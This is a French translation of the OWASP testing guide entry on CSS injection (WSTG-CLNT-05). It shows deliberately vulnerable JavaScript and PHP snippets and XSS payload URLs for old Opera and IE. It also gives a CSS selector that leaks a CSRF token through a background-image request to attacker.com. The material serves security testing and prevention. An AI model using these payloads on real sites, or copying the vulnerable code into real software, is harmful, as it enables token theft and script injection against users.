# Test d'injection CSS

|ID          |
|------------|
|WSTG-CLNT-05|

## Sommaire

Une vulnérabilité d'injection CSS implique la capacité d'injecter du code CSS arbitraire dans le contexte d'un site Web de confiance qui est rendu dans le navigateur d'une victime. L'impact de ce type de vulnérabilité varie en fonction de la charge utile CSS fournie. Cela peut conduire à des scripts intersites ou à une exfiltration de données.

Cette vulnérabilité se produit lorsque l'application permet au CSS fourni par l'utilisateur d'interférer avec les feuilles de style légitimes de l'application. L'injection de code dans le contexte CSS peut permettre à un attaquant d'exécuter JavaScript dans certaines conditions, ou d'extraire des valeurs sensibles à l'aide de sélecteurs CSS et de fonctions capables de générer des requêtes HTTP. Généralement, permettre aux utilisateurs de personnaliser les pages en fournissant des fichiers CSS personnalisés représente un risque considérable.

Le code JavaScript suivant montre un possible script vulnérable dans lequel l'attaquant est capable de contrôler le `location.hash` (source) qui atteint la fonction `cssText` (sink). Ce cas particulier peut conduire à XSS basé sur DOM dans les anciennes versions de navigateur ; pour plus d'informations, consultez le [DOM-based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).

```html
<a id="a1">Click me</a>
<script>
    if (location.hash.slice(1)) {
    document.getElementById("a1").style.cssText = "color: " + location.hash.slice(1);
    }
</script>
```

L'attaquant pourrait cibler la victime en lui demandant de visiter les URL suivantes :

- `www.victim.com/#red;-o-link:'<javascript:alert(1)>';-o-link-source:current;` (Opera \[8,12\])
- `www.victim.com/#red;-:expression(alert(URL=1));` (IE 7/8)

La même vulnérabilité peut apparaître dans le cas du XSS réfléchi, par exemple, dans le code PHP suivant :

```html
<style>
p {
    color: <?php echo $_GET['color']; ?>;
    text-align: center;
}
</style>
```

D'autres scénarios d'attaque impliquent la possibilité d'extraire des données grâce à l'adoption de règles CSS pures. De telles attaques peuvent être menées via des sélecteurs CSS, conduisant à l'exfiltration de données, par exemple, des jetons CSRF.

Voici un exemple de code qui tente de sélectionner une entrée avec un `name` correspondant à `csrf_token` et une `value` commençant par un `a`. En utilisant une attaque par force brute pour déterminer la "valeur" de l'attribut, il est possible d'effectuer une attaque qui envoie la valeur au domaine de l'attaquant, par exemple en essayant de définir une image d'arrière-plan sur l'élément d'entrée sélectionné.

```html
<style>
input[name=csrf_token][value=^a] {
    background-image: url(http://attacker.com/log?a);
}
</style>
```

D'autres attaques utilisant du contenu sollicité, telles que CSS, sont présentées dans [Mario Heiderich's talk, "Got Your Nose"](https://www.youtube.com/watch?v=FIQvAaZj_HA) sur YouTube.

## Objectifs des tests

- Identifier les points d'injection CSS.
- Évaluer l'impact de l'injection.

## Comment tester

Le code doit être analysé pour déterminer si un utilisateur est autorisé à injecter du contenu dans le contexte CSS. En particulier, la manière dont le site Web renvoie les règles CSS sur la base des entrées doit être inspectée.

Voici un exemple de base :

```html
<a id="a1">Click me</a>
<b>Hi</b>
<script>
    $("a").click(function(){
        $("b").attr("style","color: " + location.hash.slice(1));
    });
</script>
```

Le code ci-dessus contient une source `location.hash`, contrôlée par l'attaquant, qui peut s'injecter directement dans l'attribut `style` d'un élément HTML. Comme mentionné ci-dessus, cela peut conduire à des résultats différents selon le navigateur utilisé et la charge utile fournie.

Les pages suivantes fournissent des exemples de vulnérabilités d'injection CSS :

- [Mot de passe "cracker" via CSS et HTML5](http://html5sec.org/invalid/?length=25)
- [Lecture des attributs CSS](http://eaea.sirdarckcat.net/cssar/v2/)
- [Attaques basées sur JavaScript utilisant `CSSStyleDeclaration` avec une entrée non échappée](https://github.com/wisec/domxsswiki/wiki/CSS-Text-sink)

Pour plus de ressources OWASP sur la prévention de l'injection CSS, consultez la [Fiche de triche pour la sécurisation des feuilles de style en cascade](https://cheatsheetseries.owasp.org/cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html).
